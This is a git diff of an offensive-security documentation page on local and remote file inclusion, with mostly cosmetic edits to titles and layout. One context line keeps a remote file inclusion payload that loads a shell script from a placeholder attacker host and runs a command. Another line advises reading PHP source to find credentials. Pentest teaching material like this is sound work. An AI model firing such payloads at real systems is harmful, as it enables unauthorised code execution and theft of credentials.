@@ -1,6 +1,6 @@
 ---
 title: "LFI / RFI"
-sidebarTitle: "File inclusion: LFI and RFI"
+sidebarTitle: "LFI & RFI"
 description: "Enumerate file selectors, investigate path handling, read source, and verify wrapper, upload, log, and remote-inclusion branches."
 keywords: ["lfi", "rfi", "file inclusion", "path traversal", "php wrappers", "log poisoning", "php filter", "local file inclusion", "remote file inclusion"]
 ---
@@ -15,9 +15,7 @@ import { TargetContextBar } from "/snippets/target-context-bar.jsx";
 
 {/* COMMAND_SHORTCUT_START */}
 
-**Current starting checks:** [Web: Enumeration Methodology](/web/methodology)
-
-Distinguish file disclosure, local inclusion and remote fetching. Execution depends on the actual parser/configuration and controllable content, not traversal alone.
+**Current starting checks:** [Web: Enumeration Methodology](/web/methodology) — *Distinguish file disclosure, local inclusion and remote fetching. Execution depends on the actual parser/configuration and controllable content, not traversal alone.*
 
 {/* COMMAND_SHORTCUT_END */}
 
@@ -256,6 +254,8 @@ http://$IP/?page=http://ATTACKER/sh.php&0=id
 > Wrap traversal in filter wrappers to read PHP source without executing it — great for finding creds and more bugs.
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
